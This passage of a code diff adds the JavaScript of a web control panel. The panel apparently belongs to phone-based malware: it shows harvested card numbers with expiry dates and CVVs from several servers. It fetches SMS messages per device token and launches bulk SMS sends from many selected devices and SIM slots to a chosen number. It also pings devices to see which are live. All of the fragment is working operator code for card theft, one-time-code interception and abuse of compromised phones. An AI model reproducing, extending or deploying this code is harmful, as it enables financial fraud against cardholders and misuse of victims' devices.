+                    var html = '<div style="font-size:13px;color:var(--blue-dark);margin-bottom:12px;font-weight:800;letter-spacing:1px;">💳 FOUND ' + cards.length + ' CARDS (ALL SERVERS)</div>';
+                    cards.forEach(function (c) {
+                        html += '<div class="bitem carditem" data-token="' + esc(c.token) + '">'
+                            + '<div class="r1"><span class="bn">' + esc(c.number) + '</span><span class="ba">' + esc(c.exp) + '</span></div>'
+                            + '<div class="sub">TOKEN: ' + esc(c.token) + ' | CVV: ' + esc(c.cvv) + (c.srcTag ? ' | <b style="color:var(--blue);">' + esc(c.srcTag) + '</b>' : '') + '</div>'
+                            + '</div>';
+                    });
+                    body.innerHTML = html;
+                    body.addEventListener('click', function (e) {
+                        var item = e.target.closest('.carditem');
+                        if (item) openTokenSms(item.getAttribute('data-token'));
+                    });
+                } catch (e) {
+                    if (body) body.innerHTML = '<div class="center-box"><div style="font-size:50px;margin-bottom:10px;">⚠️</div><div class="t">FETCH FAILED</div><div class="sub">' + esc(e.message) + '</div></div>';
+                }
+            }
+
+            async function openTokenSms(token) {
+                lockBodyScroll();
+                $modalRoot.innerHTML = '<div class="overlay" id="overlay"><div class="modal">'
+                    + '<div class="modal-head"><h2>💳 TOKEN SMS</h2><button class="modal-close" id="mClose">✕</button></div>'
+                    + '<div class="modal-tools"><button class="mini-btn" id="tokenSmsReload">🔄 REFRESH</button></div>'
+                    + '<div style="font-size:11px;font-weight:800;color:var(--text-dim);margin-bottom:10px;word-break:break-all;">' + esc(token) + '</div>'
+                    + '<div id="tokenSmsBody"><div class="center-box" style="padding:30px;"><div class="t">FETCHING...</div></div></div>'
+                    + '</div></div>';
+                document.getElementById('mClose').onclick = closeModal;
+                document.getElementById('overlay').onclick = function (e) { if (e.target === this) closeModal(); };
+                document.getElementById('tokenSmsReload').onclick = function () { loadTokenSmsData(token); };
+                await loadTokenSmsData(token);
+            }
+
+            async function loadTokenSmsData(token) {
+                var body = document.getElementById('tokenSmsBody');
+                if (body) body.innerHTML = '<div class="center-box" style="padding:30px;"><div class="t">FETCHING...</div><div class="sub">Loading token messages</div></div>';
+                try {
+                    var tokenPromises = sources.map(async function (src) {
+                        var paths = deviceSmsPaths(token);
+                        for (var pi = 0; pi < paths.length; pi++) {
+                            try {
+                                var r = await fetch(src.url + paths[pi] + authQuery(src.secret));
+                                if (!r.ok) continue;
+                                var v = await r.json();
+                                if (v && typeof v === 'object' && !Array.isArray(v) && Object.keys(v).length > 0) return v;
+                            } catch (e) { }
+                        }
+                        return null;
+                    });
+                    var results = await Promise.all(tokenPromises);
+                    var mergedTokenData = {};
+                    results.forEach(function (v) {
+                        if (v && typeof v === 'object') Object.assign(mergedTokenData, v);
+                    });
+
+                    var arr = [];
+                    Object.keys(mergedTokenData).forEach(function (key) {
+                        var m = mergedTokenData[key];
+                        if (!m || typeof m !== 'object' || Array.isArray(m)) return;
+                        var text = m.message || m.body || m.msg || '';
+                        if (!text) return;
+                        var date = m.dateTime || m.date || m.time || m.TimeandDate || '';
+                        arr.push({
+                            text: String(text),
+                            sender: String(m.sender || m.from || m.number || 'Unknown'),
+                            time: String(date || ''),
+                            ts: parseSmsTime(date, m.timestamp || m.id || key)
+                        });
+                    });
+                    arr.sort(function (a, b) { return b.ts - a.ts; });
+                    if (!body) return;
+                    if (arr.length === 0) {
+                        body.innerHTML = '<div style="text-align:center;padding:30px;color:var(--blue);font-size:15px;font-weight:800;">NO SMS FOUND</div>';
+                        return;
+                    }
+                    var html = '';
+                    arr.forEach(function (m) {
+                        html += '<div class="smsitem">'
+                            + '<div class="sh"><span>📩 ' + esc(m.sender) + '</span><span class="time">' + esc(m.time || fmtTime(m.ts)) + '</span></div>'
+                            + '<div class="sb">' + esc(m.text) + '</div>'
+                            + '</div>';
+                    });
+                    body.innerHTML = html;
+                } catch (e) {
+                    if (body) body.innerHTML = '<div class="center-box"><div style="font-size:50px;margin-bottom:10px;">⚠️</div><div class="t">FETCH FAILED</div><div class="sub">' + esc(e.message) + '</div></div>';
+                }
+            }
+
+            function openBulkModal() {
+                lockBodyScroll();
+                $modalRoot.innerHTML = '<div class="overlay" id="overlay"><div class="modal">'
+                    + '<div class="modal-head"><h2>📤 BULK SENDER</h2><button class="modal-close" id="mClose">✕</button></div>'
+                    + '<div class="modal-tools">'
+                    + '<button class="mini-btn" id="bulkAll">SELECT ALL</button>'
+                    + '<button class="mini-btn" id="bulkActive">ACTIVE</button>'
+                    + '<button class="mini-btn" id="bulkClear">CLEAR</button>'
+                    + '<span class="mini-count" id="bulkCount">0 selected</span>'
+                    + '</div>'
+                    + '<div class="bulk-list" id="bulkList"></div>'
+                    + '<div class="sform" style="margin-top:12px;">'
+                    + '<div class="fl">SELECT SIM</div>'
+                    + '<div class="sims" id="bulkSims">'
+                    + '<button data-sim="1" class="' + (bulkSimSel === 1 ? 'active' : '') + '">SIM 1</button>'
+                    + '<button data-sim="2" class="' + (bulkSimSel === 2 ? 'active' : '') + '">SIM 2</button>'
+                    + '</div>'
+                    + '<div class="fl">RECIPIENT</div>'
+                    + '<input type="text" id="bulkNum" placeholder="+91XXXXXXXXXX" />'
+                    + '<div class="fl">MESSAGE</div>'
+                    + '<textarea id="bulkMsg" placeholder="Type your message..."></textarea>'
+                    + '<button class="sbtn" id="bulkSendBtn">📤 LAUNCH BULK SEND</button>'
+                    + '<div class="bulk-progress" id="bulkProgressWrap" style="display:none;">'
+                    + '<div class="progress"><div id="bulkProgressBar"></div></div>'
+                    + '<div class="bulk-progress-label" id="bulkProgressLabel">0/0</div>'
+                    + '</div>'
+                    + '</div>'
+                    + '</div></div>';
+
+                document.getElementById('mClose').onclick = closeModal;
+                document.getElementById('overlay').onclick = function (e) { if (e.target === this) closeModal(); };
+
+                var list = document.getElementById('bulkList');
+                if (!devices.length) {
+                    list.innerHTML = '<div style="text-align:center;padding:20px;color:var(--blue);font-size:13px;font-weight:800;">NO DEVICES</div>';
+                } else {
+                    var html = '';
+                    devices.forEach(function (d) {
+                        html += '<label class="bdev' + (d.muted ? ' muted' : '') + '">'
+                            + '<input type="checkbox" class="bulkcheck" value="' + esc(dkey(d)) + '"' + (d.muted ? ' data-muted="1"' : '') + '>'
+                            + '<span class="bname">' + esc(d.name) + (d._srcTag ? ' <small style="color:var(--blue-dark);font-weight:800;">[' + esc(d._srcTag) + ']</small>' : '') + '</span>'
+                            + '<span class="bstatus ' + (d.status ? 'on' : 'off') + '">' + (d.status ? 'ON' : 'OFF') + '</span>'
+                            + (d.muted ? '<span class="mute-tag">MUTED</span>' : '')
+                            + '</label>';
+                    });
+                    list.innerHTML = html;
+                }
+
+                function updateCount() {
+                    var n = document.querySelectorAll('#bulkList .bulkcheck:checked').length;
+                    document.getElementById('bulkCount').textContent = n + ' selected';
+                }
+                list.addEventListener('change', updateCount);
+
+                document.getElementById('bulkAll').onclick = function () {
+                    var c = list.querySelectorAll('.bulkcheck');
+                    for (var i = 0; i < c.length; i++) c[i].checked = true;
+                    updateCount();
+                };
+                var blp = document.getElementById('bulkLivePing');
+                if (blp) {
+                    blp.onclick = function () {
+                        var c = list.querySelectorAll('.bulkcheck');
+                        for (var i = 0; i < c.length; i++) {
+                            var dk = c[i].value;
+                            var d = devices.find(function (x) { return dkey(x) === dk || String(x.id) === dk; });
+                            c[i].checked = !!(d && d.isPingLive);
+                        }
+                        updateCount();
+                        toast('Selected live pinged devices only! 📡', 'ok');
+                    };
+                }
+
+                document.getElementById('bulkActive').onclick = function () {
+                    var c = list.querySelectorAll('.bulkcheck');
+                    for (var i = 0; i < c.length; i++) {
+                        c[i].checked = c[i].getAttribute('data-muted') !== '1';
+                    }
+                    updateCount();
+                };
+                document.getElementById('bulkClear').onclick = function () {
+                    var c = list.querySelectorAll('.bulkcheck');
+                    for (var i = 0; i < c.length; i++) c[i].checked = false;
+                    updateCount();
+                };
+
+                var simsBox = document.getElementById('bulkSims');
+                simsBox.onclick = function (e) {
+                    var b = e.target.closest('button');
+                    if (!b) return;
+                    bulkSimSel = parseInt(b.getAttribute('data-sim'), 10);
+                    var all = simsBox.querySelectorAll('button');
+                    for (var i = 0; i < all.length; i++) all[i].classList.remove('active');
+                    b.classList.add('active');
+                };
+                document.getElementById('bulkSendBtn').onclick = startBulkSend;
+            }
+
+            function startBulkSend() {
+                var checks = document.querySelectorAll('#bulkList .bulkcheck:checked');
+                if (!checks.length) { toast('Select devices first!', 'warn'); return; }
+                var targets = [];
+                for (var i = 0; i < checks.length; i++) {
+                    var dk = checks[i].value;
+                    var d = devices.find(function (x) { return dkey(x) === dk || String(x.id) === dk; });
+                    if (d) targets.push(d);
+                }
+                var active = targets.filter(function (d) { return !d.muted; });
+                var muted = targets.filter(function (d) { return d.muted; });
+                if (!active.length) { toast('All selected devices are muted!', 'err'); return; }
+                var num = (document.getElementById('bulkNum') || {}).value;
+                var msg = (document.getElementById('bulkMsg') || {}).value;
+                num = num ? num.trim() : '';
+                msg = msg ? msg.trim() : '';
+                if (!num || !msg) { toast('Fill all fields!', 'err'); return; }
+                if (muted.length > 0) {
+                    confirmBox({
+                        title: 'SKIP MUTED?',
+                        message: muted.length + ' muted device(s) will be skipped.<br>Continue with <b>' + active.length + '</b> active devices?',
+                        yesText: 'PROCEED',
+                        icon: '⚠️'
+                    }, function () { performBulkSend(active, num, msg); });
+                    return;
+                }
+                performBulkSend(active, num, msg);
+            }
+
+            async function performBulkSend(targets, phone, message) {
+                var btn = document.getElementById('bulkSendBtn');
+                var wrap = document.getElementById('bulkProgressWrap');
+                var bar = document.getElementById('bulkProgressBar');
+                var label = document.getElementById('bulkProgressLabel');
+                if (btn) { btn.disabled = true; btn.textContent = 'SENDING...'; }
+                if (wrap) wrap.style.display = 'block';
+                if (bar) bar.style.width = '0%';
+                if (label) label.textContent = '0/' + targets.length;
+
+                var completed = 0;
+                var success = 0;
+                var slot = String(bulkSimSel);
+
+                async function sendOne(d) {
+                    try {
+                        var ok = await queueSms(d, phone, message, slot);
+                        if (ok) success++;
+                    } catch (e) { }
+                    completed++;
+                    if (bar) bar.style.width = Math.round(completed * 100 / targets.length) + '%';
+                    if (label) label.textContent = completed + '/' + targets.length;
+                }
+
+                await runLimited(targets, 8, sendOne);
+
+                if (btn) { btn.disabled = false; btn.textContent = '📤 LAUNCH BULK SEND'; }
+                toast('Bulk complete: ' + success + '/' + targets.length, success === targets.length ? 'ok' : 'warn');
+            }
+
+            async function runLimited(items, limit, worker) {
+                var index = 0;
+                async function next() {
+                    while (index < items.length) {
+                        var i = index++;
+                        await worker(items[i]);
+                    }
+                }
+                var runners = [];
+                var n = Math.min(limit, items.length);
+                for (var i = 0; i < n; i++) runners.push(next());
+                await Promise.all(runners);
+            }
+
+            function closeModal() { $modalRoot.innerHTML = ''; unlockBodyScroll(); }
+
+            document.getElementById('filterbar').addEventListener('click', function (e) {
+                var b = e.target.closest('button[data-f]');
+                if (!b) return;
+                var all = this.querySelectorAll('button[data-f]');
+                for (var i = 0; i < all.length; i++) all[i].classList.remove('active');
+                b.classList.add('active');
+                currentFilter = b.getAttribute('data-f');
+                applyFilter();
+            });
+
+            document.getElementById('sortSel').onchange = function () {
+                currentSort = this.value;
+                applyFilter();
+            };
+
+            var searchDebounce;
+            document.getElementById('searchInput').oninput = function () {
+                var self = this;
+                clearTimeout(searchDebounce);
+                searchDebounce = setTimeout(function () {
+                    searchQ = self.value.trim();
+                    applyFilter();
+                }, 200);
+            };
+
+            async function runLivePing() {
+                var btn = document.getElementById('pingBtn');
+                if (btn) {
+                    btn.disabled = true;
+                    btn.innerHTML = '<span class="ico">⏳</span> PINGING...';
+                }
+                toast('📡 Pinging all devices on server...', 'warn');
+
+                await fetchAll(true);
+                devices.forEach(calculateDevicePing);
+
+                currentFilter = 'ping';
+                var all = document.querySelectorAll('#filterbar button[data-f]');
+                for (var i = 0; i < all.length; i++) {
+                    if (all[i].getAttribute('data-f') === 'ping') all[i].classList.add('active');
+                    else all[i].classList.remove('active');
+                }
+                applyFilter();
+
+                var liveCount = devices.filter(function (d) { return d.isPingLive; }).length;
+                toast('🎯 Ping Success! ' + liveCount + ' live devices responded', 'ok');
+
+                if (btn) {
+                    btn.disabled = false;
+                    btn.innerHTML = '<span class="ico">📡</span> LIVE PING';
+                }
+            }
+
+            window.clearPingFilter = function () {
+                currentFilter = 'all';
+                var all = document.querySelectorAll('#filterbar button[data-f]');
+                for (var i = 0; i < all.length; i++) {
+                    if (all[i].getAttribute('data-f') === 'all') all[i].classList.add('active');
+                    else all[i].classList.remove('active');
+                }
+                applyFilter();
+            };
+
+            var pingBtnEl = document.getElementById('pingBtn');
+            if (pingBtnEl) pingBtnEl.onclick = runLivePing;
+
+            var statPingEl = document.getElementById('statPingCell');
+            if (statPingEl) statPingEl.onclick = function () {
+                currentFilter = 'ping';
+                var all = document.querySelectorAll('#filterbar button[data-f]');
+                for (var i = 0; i < all.length; i++) {
+                    if (all[i].getAttribute('data-f') === 'ping') all[i].classList.add('active');
+                    else all[i].classList.remove('active');
+                }
+                applyFilter();
+                toast('Showing only Live Ping devices 📡', 'warn');
+            };
+
+            document.getElementById('allSmsBtn').onclick = openAllSmsModal;
+            // cardsBtn disabled - click disabled
+            // document.getElementById('cardsBtn').onclick = openCardsModal;
+            document.getElementById('bulkBtn').onclick = openBulkModal;
+            document.getElementById('starBtn').onclick = function () {
+                currentFilter = 'starred';
+                var all = document.querySelectorAll('#filterbar button[data-f]');
+                for (var i = 0; i < all.length; i++) all[i].classList.remove('active');
+                applyFilter();
+                toast('Showing starred ⭐', 'warn');
+            };
+
+            document.getElementById('fabBtn').onclick = function () {
+                var btn = this;
+                btn.style.animation = 'none';
+                btn.style.transform = 'rotate(360deg)';
+                setTimeout(function () {
+                    btn.style.transform = '';
+                    btn.style.animation = '';
+                }, 500);
+                toast('Refreshing...', 'warn');
+                fetchAll(false);
+            };
+
+            initLogin();
+
+        })();
+
+    </script>
+</body>
+
+</html>
